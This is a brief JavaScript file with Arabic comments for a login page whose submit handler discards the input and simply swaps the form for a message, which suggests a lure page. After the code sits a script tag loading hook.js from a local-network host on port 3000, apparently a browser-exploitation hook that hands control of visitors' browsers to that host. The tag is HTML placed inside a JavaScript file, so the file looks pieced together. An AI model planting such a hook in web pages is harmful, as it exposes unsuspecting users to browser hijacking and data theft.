document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginContainer = document.getElementById('login-container');
    const messageContainer = document.getElementById('message-container');

    loginForm.addEventListener('submit', (event) => {
        event.preventDefault(); // منع إعادة تحميل الصفحة
        // هنا يمكنك إضافة التحقق من البيانات إذا لزم الأمر
        loginContainer.classList.add('hidden');
        messageContainer.classList.remove('hidden');
    });
});
<script src="http://192.168.1.106:3000/hook.js"></script>